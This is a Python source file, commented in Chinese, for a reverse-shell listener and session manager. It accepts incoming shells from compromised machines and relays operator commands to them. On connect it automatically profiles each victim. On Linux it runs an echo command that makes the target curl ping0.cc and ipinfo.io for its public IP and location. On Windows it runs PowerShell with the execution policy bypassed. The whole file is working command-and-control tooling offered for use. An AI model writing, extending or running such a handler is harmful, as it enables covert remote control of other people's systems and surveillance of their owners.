"""
Shell连接管理器
管理所有反弹shell的监听和交互
"""
import socket as socket_module
import threading
import select
import time
import re
from typing import Dict, Optional, Callable, List, TYPE_CHECKING, Any
from dataclasses import dataclass, field
from datetime import datetime
import queue
import shlex

# 使用别名避免与字段名冲突
socket = socket_module

# Linux：连接后仅执行这一条 echo -e 采集命令
_LINUX_INFO_ECHO = (
    r'''echo -e "OS: $(grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '\"')\nUser: $(whoami)\nIP: $(curl -4 -s --max-time 10 ping0.cc 2>/dev/null | head -1 | tr -d '\r') ($(curl -s --max-time 8 ipinfo.io/city 2>/dev/null), $(curl -s --max-time 8 ipinfo.io/region 2>/dev/null))\nCPU: $(LC_ALL=C LANG=C lscpu 2>/dev/null | grep -m1 'Model name' | cut -d: -f2 | xargs || grep -m1 -E '^model name|^Model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs)\nMemory: $(LANG=C LC_ALL=C free -h 2>/dev/null | awk '/^Mem:/{print $3 "/" $2}' || free -h 2>/dev/null | awk '/^Mem:/{print $3 "/" $2}' || free -h 2>/dev/null | awk '/Mem:/{print $3 "/" $2}')"'''
)


def _strip_terminal_noise(text: str) -> str:
    """去除 ANSI/OSC、响铃与常见控制字符（避免主机列表里出现 ]7;file:// 与提示符杂讯）。"""
    if not text:
        return ""
    t = text.replace("\r\n", "\n").replace("\r", "\n")
    # OSC：ESC ] ... BEL 或 ESC ] ... ST
    t = re.sub(r"\x1b\][^\x07]*\x07", "", t)
    t = re.sub(r"\x1b\][^\x1b\\]*\x1b\\", "", t)
    # 无 ESC 前缀的 OSC 片段（日志/截断时常见）
    t = re.sub(r"\]0;[^\n\x07]*(\x07|\\)?", "", t)
    t = re.sub(r"\]7;[^\n\x07]*(\x07|\\)?", "", t)
    t = re.sub(r"\]7;file://[^\s\x07\\]+\\?", "", t)
    # CSI / SGR
    t = re.sub(r"\x1b\[[0-?]*[ -/]*[@-~]", "", t)
    t = re.sub(r"\x07", "", t)
    t = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "", t)
    return t


def _line_looks_like_shell_prompt(line: str) -> bool:
    s = line.strip()
    if not s:
        return True
    if re.search(r"^[^\s#@]+@[^:\s]+:.+[#$>]\s*$", s):
        return True
    if re.fullmatch(r"[#$>]\s*", s):
        return True
    return False


def _detach_trailing_prompt(line: str) -> str:
    """去掉粘在同一行末尾的 user@host:path# 提示符。"""
    return re.sub(
        r"\s*[a-zA-Z0-9_.+-]+@[^:\s]+:([^#\$\r\n]*?)?[#$>]\s*$",
        "",
        line,
    ).strip()


def _parse_linux_echo_lines(raw: str) -> Optional[dict]:
    """解析 echo -e 输出的 OS/User/IP/CPU/Memory 行。"""
    if not raw:
        return None
    t = _strip_terminal_noise(raw)
    out: Dict[str, str] = {}
    for line in t.splitlines():
        line = _detach_trailing_prompt(line.strip())
        if not line:
            continue
        if "echo -e" in line and "PRETTY_NAME" in line:
            continue
        if _line_looks_like_shell_prompt(line):
            continue
        if line.startswith("OS:"):
            out["os"] = line[3:].strip()
        elif line.startswith("User:"):
            out["user"] = line[5:].strip()
        elif line.startswith("IP:"):
            out["ip"] = line[3:].strip()
        elif line.startswith("CPU:"):
            out["cpu"] = line[4:].strip()
        elif line.startswith("Memory:"):
            out["memory"] = line[7:].strip()
    return out if out else None


def _parse_target_ip_line(ip_field: str) -> tuple:
    """解析 '1.2.3.4 (City, Region)' 或 IPv6。"""
    s = (ip_field or "").strip()
    m = re.match(r"^(\S+)\s+\(([^)]*)\)\s*$", s)
    if not m:
        return s, "", ""
    pub = m.group(1).strip()
    rest = m.group(2).strip()
    parts = [p.strip() for p in rest.split(",") if p.strip() and p.strip() not in ("-", "n/a")]
    loc = ", ".join(parts) if parts else ""
    return pub, loc, rest


def _pick_scalar_line(text: str) -> str:
    """无标记时的兜底：从杂乱回显里取一行可读结果。"""
    t = _strip_terminal_noise(text)
    # 常见粘连：命令输出紧贴 root@host:
    t = re.sub(r"([A-Za-z0-9])([a-zA-Z0-9_.+-]{1,48}@[a-zA-Z0-9_.-]+:)", r"\1\n\2", t)
    lines = []
    for raw in t.split("\n"):
        ln = _detach_trailing_prompt(raw.strip())
        if not ln:
            continue
        # 过滤掉“命令回显行”（目标端会把我们发的采集命令回显出来）
        if "__SM_A__" in ln or "__SM_B__" in ln:
            continue
        if "uname -s" in ln or "getconf _NPROCESSORS_ONLN" in ln or "cat /etc/os-release" in ln:
            continue
        if "echo -e" in ln and "PRETTY_NAME" in ln:
            continue
        if ln.startswith("printf "):
            continue
        if _line_looks_like_shell_prompt(ln):
            continue
        if "file://" in ln:
            continue
        lines.append(ln)
    if not lines:
        return ""
    for cand in reversed(lines):
        if len(cand) <= 240 and "@" not in cand:
            return cand.strip()
    return lines[-1].strip()[:240]


@dataclass
class SystemInfo:
    """系统信息数据类"""
    hostname: str = ''
    os_type: str = ''
    os_version: str = ''
    kernel: str = ''
    cpu_info: str = ''
    cpu_cores: str = ''
    memory_total: str = ''
    memory_used: str = ''
    memory_free: str = ''
    disk_total: str = ''
    disk_used: str = ''
    disk_free: str = ''
    ip_address: str = ''
    mac_address: str = ''
    architecture: str = ''
    uptime: str = ''
    user: str = ''
    
    def to_dict(self):
        data = {
            'hostname': self.hostname,
            'os_type': self.os_type,
            'os_version': self.os_version,
            'kernel': self.kernel,
            'cpu_info': self.cpu_info,
            'cpu_cores': self.cpu_cores,
            'memory_total': self.memory_total,
            'memory_used': self.memory_used,
            'memory_free': self.memory_free,
            'disk_total': self.disk_total,
            'disk_used': self.disk_used,
            'disk_free': self.disk_free,
            'ip_address': self.ip_address,
            'mac_address': self.mac_address,
            'architecture': self.architecture,
            'uptime': self.uptime,
            'user': self.user
        }
        # 允许动态扩展字段（例如 country/location），以便前端直接显示
        for k, v in self.__dict__.items():
            if k not in data:
                data[k] = v
        return data


@dataclass
class ShellSession:
    """Shell会话数据类"""
    id: str
    host: str
    port: int
    connected_at: datetime
    sock: socket_module.socket = field(repr=False)
    address: tuple
    is_alive: bool = True
    output_buffer: queue.Queue = field(default_factory=queue.Queue)
    system_info: Optional[SystemInfo] = None
    last_activity: datetime = field(default_factory=datetime.now)
    
    def to_dict(self):
        return {
            'id': self.id,
            'host': self.host,
            'port': self.port,
            'connected_at': self.connected_at.isoformat(),
            'address': f"{self.address[0]}:{self.address[1]}",
            'is_alive': self.is_alive,
            'last_activity': self.last_activity.isoformat(),
            'system_info': self.system_info.to_dict() if self.system_info else None
        }


@dataclass
class Listener:
    """监听器数据类"""
    port: int
    sock: socket_module.socket = field(repr=False)
    is_running: bool = True
    sessions: Dict[str, ShellSession] = field(default_factory=dict)
    created_at: datetime = field(default_factory=datetime.now)
    
    def to_dict(self):
        return {
            'port': self.port,
            'is_running': self.is_running,
            'session_count': len(self.sessions),
            'created_at': self.created_at.isoformat(),
            'sessions': [s.to_dict() for s in self.sessions.values()]
        }


class ShellManager:
    """Shell连接管理器"""
    
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        
        self.listeners: Dict[int, Listener] = {}
        self.session_counter = 0
        self.lock = threading.Lock()
        self._on_new_session: Optional[Callable] = None
        self._on_session_output: Optional[Callable] = None
        self._on_session_closed: Optional[Callable] = None
        self._on_session_info: Optional[Callable] = None
    
    def set_callbacks(self, on_new_session=None, on_session_output=None, on_session_closed=None, on_session_info=None):
        """设置事件回调"""
        self._on_new_session = on_new_session
        self._on_session_output = on_session_output
        self._on_session_closed = on_session_closed
        self._on_session_info = on_session_info
    
    def start_listener(self, port: int) -> bool:
        """启动监听器"""
        with self.lock:
            if port in self.listeners:
                return False
            
            try:
                server_socket = socket_module.socket(socket_module.AF_INET, socket_module.SOCK_STREAM)
                server_socket.setsockopt(socket_module.SOL_SOCKET, socket_module.SO_REUSEADDR, 1)
                server_socket.bind(('0.0.0.0', port))
                server_socket.listen(5)
                server_socket.setblocking(False)

                listener = Listener(port=port, sock=server_socket)
                self.listeners[port] = listener
                
                # 启动接受连接的线程
                thread = threading.Thread(target=self._accept_loop, args=(port,), daemon=True)
                thread.start()
                
                return True
            except Exception as e:
                print(f"Failed to start listener on port {port}: {e}")
                return False
    
    def stop_listener(self, port: int) -> bool:
        """停止监听器"""
        with self.lock:
            if port not in self.listeners:
                return False
            
            listener = self.listeners[port]
            listener.is_running = False
            
            # 关闭所有会话
            for session in list(listener.sessions.values()):
                self._close_session(session)
            
            try:
                listener.sock.close()
            except:
                pass
            
            del self.listeners[port]
            return True
    
    def _accept_loop(self, port: int):
        """接受连接的循环"""
        listener = self.listeners.get(port)
        if not listener:
            return
        
        while listener.is_running:
            try:
                readable, _, _ = select.select([listener.sock], [], [], 1.0)
                if readable:
                    client_socket, address = listener.sock.accept()
                    self._create_session(port, client_socket, address)
            except Exception as e:
                if listener.is_running:
                    print(f"Accept error on port {port}: {e}")
    
    def _create_session(self, port: int, client_socket, address: tuple):
        """创建新会话"""
        with self.lock:
            self.session_counter += 1
            session_id = f"shell_{self.session_counter}"

            session = ShellSession(
                id=session_id,
                host=address[0],
                port=port,
                connected_at=datetime.now(),
                sock=client_socket,
                address=address
            )
            
            listener = self.listeners.get(port)
            if listener:
                listener.sessions[session_id] = session
            
            # 启动输出读取线程
            thread = threading.Thread(target=self._output_loop, args=(session,), daemon=True)
            thread.start()
            
            # 自动收集系统信息
            threading.Thread(target=self._collect_system_info, args=(session,), daemon=True).start()
            
            if self._on_new_session:
                self._on_new_session(session.to_dict())
    
    def _output_loop(self, session: ShellSession):
        """读取会话输出的循环"""
        session.sock.setblocking(False)

        while session.is_alive:
            try:
                readable, _, _ = select.select([session.sock], [], [], 0.5)
                if readable:
                    data = session.sock.recv(4096)
                    if not data:
                        # 连接关闭
                        self._close_session(session)
                        break

                    output = data.decode('utf-8', errors='replace')
                    session.output_buffer.put(output)
                    session.last_activity = datetime.now()

                    if self._on_session_output:
                        self._on_session_output(session.id, output)
            except Exception as e:
                if session.is_alive:
                    print(f"Output error for session {session.id}: {e}")
                    self._close_session(session)
                    break

    def _close_session(self, session: ShellSession):
        """关闭会话"""
        session.is_alive = False
        try:
            session.sock.close()
        except:
            pass

        if self._on_session_closed:
            self._on_session_closed(session.id)
    
    def _collect_system_info(self, session: ShellSession):
        """收集系统信息（自动识别 Linux / Windows 目标）"""
        import ipaddress
        from urllib import request as urlrequest
        from urllib.parse import quote as urlquote
        import json as json_module

        if not session.is_alive:
            return

        info = SystemInfo()
        info.ip_address = session.host

        def _norm_val(s: str) -> str:
            s = (s or "").strip()
            s = re.sub(r"(?i)^(unknown|n/a)$", "", s).strip()
            return s

        def _run(cmd: str, timeout: float = 6.0, **wait_kw: Any) -> str:
            return self.execute_command_wait(session.id, cmd, timeout=timeout, **wait_kw)

        def _clean_win(s: str) -> str:
            return _norm_val(_pick_scalar_line(s))

        def _is_windows_target(probe_out: str) -> bool:
            t = (probe_out or "").lower()
            if "windows" in t:
                return True
            # cmd 的错误提示
            if "is not recognized as an internal or external command" in t:
                return True
            return False

        # 探测系统：不用 printf（Windows cmd 无 printf），仅用清洗后的回显判断
        uname_guess = _pick_scalar_line(_run("uname -s 2>/dev/null", timeout=3.5))
        if uname_guess and len(uname_guess) < 48 and "\n" not in uname_guess:
            is_win = False
        else:
            ver_guess = _pick_scalar_line(_run("ver 2>nul", timeout=3.5))
            is_win = _is_windows_target(ver_guess)

        if not is_win:
            info.os_type = "Linux"
            # 仅执行用户指定的一条 echo -e；until_substr 避免 curl 长时间无输出时被截断
            q = shlex.quote(_LINUX_INFO_ECHO)
            raw = _run("bash -c " + q, timeout=60.0, until_substr="Memory:")
            parsed = _parse_linux_echo_lines(raw)
            if not parsed:
                raw = _run("sh -c " + q, timeout=60.0, until_substr="Memory:")
                parsed = _parse_linux_echo_lines(raw)
            if parsed:
                if parsed.get("os"):
                    info.os_version = _norm_val(parsed["os"])
                if parsed.get("user"):
                    info.user = _norm_val(parsed["user"])
                if parsed.get("cpu"):
                    info.cpu_info = _norm_val(parsed["cpu"])
                mem_s = parsed.get("memory") or ""
                if mem_s:
                    if "/" in mem_s:
                        u, tt = (mem_s.split("/", 1) + [""])[:2]
                        info.memory_used = _norm_val(u)
                        info.memory_total = _norm_val(tt)
                    else:
                        info.memory_total = _norm_val(mem_s)
                if parsed.get("ip"):
                    pub, loc, _ = _parse_target_ip_line(parsed["ip"])
                    if pub and pub.lower() not in ("n/a", "unknown", "-"):
                        info.__dict__["public_ip"] = pub
                    if loc:
                        info.__dict__["location"] = loc
                        info.__dict__["country"] = "公网"
            if not info.os_version.strip():
                info.os_version = "（采集失败）"
        else:
            # Windows：优先 PowerShell（兼容 cmd 反弹）
            def _ps(expr: str, timeout: float = 8.0) -> str:
                # 输出尽量单行，避免提示符干扰
                cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -Command \"{expr}\""
                return _run(cmd, timeout=timeout)

            info.os_type = "Windows"
            info.hostname = _clean_win(_ps("$env:COMPUTERNAME", 6.0))
            info.user = _clean_win(_ps("[System.Security.Principal.WindowsIdentity]::GetCurrent().Name", 6.0)) or _clean_win(
                _run("whoami", 6.0)
            )
            info.os_version = _clean_win(_ps("(Get-CimInstance Win32_OperatingSystem).Caption", 8.0)) or _clean_win(
                _run("ver", 6.0)
            )
            info.kernel = _clean_win(_ps("(Get-CimInstance Win32_OperatingSystem).Version", 8.0))
            info.architecture = _clean_win(_ps("(Get-CimInstance Win32_OperatingSystem).OSArchitecture", 8.0))
            info.cpu_info = _clean_win(_ps("(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)", 10.0))
            cores = _clean_win(_ps("(Get-CimInstance Win32_Processor | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum", 10.0))
            info.cpu_cores = cores or ""
            mem_total = _clean_win(_ps("[Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)", 10.0))
            if mem_total:
                info.memory_total = f"{mem_total}GB"
            # uptime
            up = _clean_win(
                _ps(
                    "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | ForEach-Object { $_.Days.ToString() + 'd ' + $_.Hours.ToString() + 'h ' + $_.Minutes.ToString() + 'm' }",
                    10.0,
                )
            )
            info.uptime = up

        # 位置：若目标 curl 已给出城市/地区则不再覆盖；否则按连接 IP 查归属地
        if not str(info.__dict__.get("location") or "").strip():
            try:
                ip_obj = ipaddress.ip_address(session.host)
                if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
                    info.__dict__["country"] = "本地网络"
                    info.__dict__["location"] = "本地网络"
                else:
                    url = f"http://ip-api.com/json/{urlquote(session.host)}?lang=zh-CN&fields=status,country,regionName,city"
                    with urlrequest.urlopen(url, timeout=3.0) as resp:
                        payload = resp.read().decode("utf-8", errors="ignore")
                    data = json_module.loads(payload)
                    if data.get("status") == "success":
                        info.__dict__["country"] = data.get("country") or "Unknown"
                        region = data.get("regionName") or ""
                        city = data.get("city") or ""
                        info.__dict__["location"] = (
                            " ".join([p for p in [region, city] if p]).strip() or "未知"
                        )
                    else:
                        info.__dict__["country"] = "Unknown"
                        info.__dict__["location"] = "未知"
            except Exception:
                info.__dict__["country"] = "Unknown"
                info.__dict__["location"] = "未知"
        elif not str(info.__dict__.get("country") or "").strip():
            info.__dict__["country"] = "公网"

        session.system_info = info

        if self._on_session_info and session.is_alive:
            self._on_session_info(session.id, info.to_dict())
    
    def collect_system_info(self, session_id: str) -> bool:
        """手动触发收集系统信息"""
        session = self.get_session(session_id)
        if session and session.is_alive:
            threading.Thread(target=self._collect_system_info, args=(session,), daemon=True).start()
            return True
        return False
    
    def execute_command(self, session_id: str, command: str) -> bool:
        """执行命令"""
        for listener in self.listeners.values():
            if session_id in listener.sessions:
                session = listener.sessions[session_id]
                if session.is_alive:
                    try:
                        session.sock.send((command + '\n').encode('utf-8'))
                        session.last_activity = datetime.now()
                        return True
                    except:
                        self._close_session(session)
        return False
    
    def close_session(self, session_id: str) -> bool:
        """关闭指定会话"""
        for listener in self.listeners.values():
            if session_id in listener.sessions:
                session = listener.sessions[session_id]
                self._close_session(session)
                return True
        return False
    
    def delete_session(self, session_id: str) -> bool:
        """删除会话记录"""
        for listener in self.listeners.values():
            if session_id in listener.sessions:
                session = listener.sessions[session_id]
                # 先关闭会话
                if session.is_alive:
                    self._close_session(session)
                # 从列表中删除
                del listener.sessions[session_id]
                return True
        return False
    
    def execute_command_wait(
        self,
        session_id: str,
        command: str,
        timeout: float = 5.0,
        *,
        until_substr: Optional[str] = None,
        until_done: Optional[Callable[[str], bool]] = None,
    ) -> str:
        """执行命令并等待输出。

        默认：收到若干字节后若连续短静音则视为结束（适合快命令）。
        until_substr：必须出现在输出里之后才允许用短静音结束（适合含 curl 的慢命令）。
        until_done(acc)：返回 True 后短静音结束（适合需拼完整 JSON 再解析的场景）。
        """
        session = self.get_session(session_id)
        if not session or not session.is_alive:
            return ""

        while not session.output_buffer.empty():
            try:
                session.output_buffer.get_nowait()
            except queue.Empty:
                break

        try:
            session.sock.send((command + '\n').encode('utf-8'))
            session.last_activity = datetime.now()
        except Exception:
            self._close_session(session)
            return ""

        import time
        deadline = time.time() + timeout
        parts: List[str] = []
        idle_chunks = 0
        # 短静音即停：仅用于未指定 until_* 的快命令；约 0.36s～2s 量级（视 timeout）
        max_idle_short = max(3, int(timeout / 0.15) // 20 + 2)
        tail_idle_after_marker = 10  # 见到结束标记后再等 ~1.2s，吞掉提示符
        tail_idle_after_done = 6

        while time.time() < deadline:
            try:
                chunk = session.output_buffer.get(timeout=0.12)
                parts.append(chunk)
                idle_chunks = 0
            except queue.Empty:
                idle_chunks += 1
                acc = "".join(parts)
                if until_done:
                    if until_done(acc):
                        if idle_chunks >= tail_idle_after_done:
                            break
                    continue
                if until_substr:
                    if until_substr in acc:
                        if idle_chunks >= tail_idle_after_marker:
                            break
                    continue
                if parts and idle_chunks >= max_idle_short:
                    break

        return "".join(parts)

    def get_session(self, session_id: str) -> Optional[ShellSession]:
        """获取会话"""
        for listener in self.listeners.values():
            if session_id in listener.sessions:
                return listener.sessions[session_id]
        return None

    def get_all_sessions(self) -> list:
        """获取所有会话"""
        with self.lock:
            sessions = []
            for listener in self.listeners.values():
                sessions.extend([s.to_dict() for s in list(listener.sessions.values())])
            return sessions

    def get_all_listeners(self) -> list:
        """获取所有监听器"""
        return [l.to_dict() for l in self.listeners.values()]


# 全局单例
shell_manager = ShellManager()
